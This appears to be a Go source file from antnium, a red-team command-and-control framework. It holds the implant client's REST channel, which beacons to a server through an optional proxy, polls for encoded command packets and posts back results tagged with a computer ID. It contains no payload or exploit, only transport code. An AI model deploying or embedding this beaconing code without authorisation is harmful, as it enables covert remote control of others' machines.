package client

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"time"

	"github.com/dobin/antnium/pkg/campaign"
	"github.com/dobin/antnium/pkg/common"
	"github.com/dobin/antnium/pkg/model"
	log "github.com/sirupsen/logrus"
)

// UpstreamWs is a connection to the server via REST
type UpstreamRest struct {
	chanIncoming chan model.Packet // Provides packets from server to client

	packetGetTimer *SleepTimer
	coder          model.Coder

	config   *ClientConfig
	campaign *campaign.Campaign
}

func MakeUpstreamRest(config *ClientConfig, campaign *campaign.Campaign) UpstreamRest {
	coder := model.MakeCoder(campaign)

	packetGetTimer := MakeSleepTimer()

	u := UpstreamRest{
		chanIncoming:   make(chan model.Packet),
		packetGetTimer: &packetGetTimer,
		coder:          coder,
		config:         config,
		campaign:       campaign,
	}
	return u
}

// Connect creates a REST connection to the server, or returns an error
func (u *UpstreamRest) Connect() error {
	proxyUrl, ok := u.campaign.GetProxy()
	if ok {
		if proxyUrl, err := url.Parse(proxyUrl); err == nil && proxyUrl.Scheme != "" && proxyUrl.Host != "" {
			proxyUrlFunc := http.ProxyURL(proxyUrl)
			http.DefaultTransport.(*http.Transport).Proxy = proxyUrlFunc
			log.Infof("UpstreamRest: Using proxy: %s", proxyUrl)
		} else {
			log.Warnf("UpstreamRest: Could not parse proxy %s (ignore): %s", proxyUrl, err.Error())
		}
	}

	// Build a empty ping packet to test
	arguments := make(model.PacketArgument)
	response := make(model.PacketResponse)
	packet := u.config.MakeClientPacket("ping", arguments, response)
	err := u.SendPacket(*packet)
	if err != nil {
		return err
	}

	return nil
}

// Start is a Thread responsible for receiving packets from server, lifetime:app
func (u *UpstreamRest) Start() {
	go func() {

		for {
			time.Sleep(u.packetGetTimer.getSleepDuration())

			// Try getting a packet from server
			packet, err := u.GetPacket()
			if err != nil {
				if err == ErrNoPacketsFound {
					fmt.Print(".")
					continue // no packets for us, maybe later
				}

				log.Errorf("UpstreamRest: Could not get packet from server (ignore): %s", err.Error())

				// Sleep and try again
				continue
			}
			// Notify state that we received a packet
			u.packetGetTimer.tick()

			// Send it to Client
			u.ChanIncoming() <- packet
		}

	}()
}

func (u *UpstreamRest) GetPacket() (model.Packet, error) {
	url := u.PacketGetUrl()
	resp, err := u.HttpGet(url)
	if err != nil {
		return model.Packet{}, fmt.Errorf("could not request URL %s: %s", url, err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return model.Packet{}, fmt.Errorf("could not request URL %s: status code is %d", url, resp.StatusCode)
	}
	bodyBytes, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return model.Packet{}, fmt.Errorf("could not read body of HTTP response from URL %s: %s", url, err)
	}

	if len(bodyBytes) <= 0 {
		return model.Packet{}, ErrNoPacketsFound
	}
	packet, err := u.coder.DecodeData(bodyBytes)
	if err != nil {
		return model.Packet{}, fmt.Errorf("UpstreamRest: Error antnium decoding of body from URL %s: %s", url, err)
	}
	return packet, nil
}

func (u *UpstreamRest) SendPacket(packet model.Packet) error {
	url := u.PacketSendUrl()

	// Setup response
	packet.ComputerId = u.config.ComputerId

	common.LogPacket("UpstreamRest:send()", packet)

	data, err := u.coder.EncodeData(packet)
	if err != nil {
		return fmt.Errorf("could not send answer to URL %s: %s", url, err.Error())
	}

	resp, err := u.HttpPost(url, bytes.NewReader(data))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("HTTP response of URL %s has wrong statuscode %d", url, resp.StatusCode)
	}

	return nil
}

// Connected returns false if we know that that websocket connection is dead
func (u *UpstreamRest) Connected() bool {
	return true
}

func (u *UpstreamRest) ChanIncoming() chan model.Packet {
	return u.chanIncoming
}
